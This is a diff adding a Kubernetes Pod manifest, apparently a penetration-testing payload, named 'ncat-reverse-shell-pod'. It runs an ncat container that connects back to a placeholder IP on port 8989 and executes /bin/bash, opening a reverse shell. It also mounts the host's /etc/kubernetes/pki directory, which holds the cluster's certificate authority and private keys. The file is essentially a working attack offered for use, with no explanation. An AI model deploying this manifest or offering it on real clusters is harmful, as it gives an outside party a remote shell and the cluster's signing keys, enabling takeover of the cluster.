@@ -1,0 +1,17 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: ncat-reverse-shell-pod
+spec:
+  containers:
+  - name: ncat-reverse-shell
+    image: raesene/ncat
+    volumeMounts:
+    - mountPath: /pki
+      name: keyvolume
+    args: ['[IP]', '8989', '-e', '/bin/bash']
+  volumes:
+  - name: keyvolume
+    hostPath:
+      path: /etc/kubernetes/pki
+      type: Directory
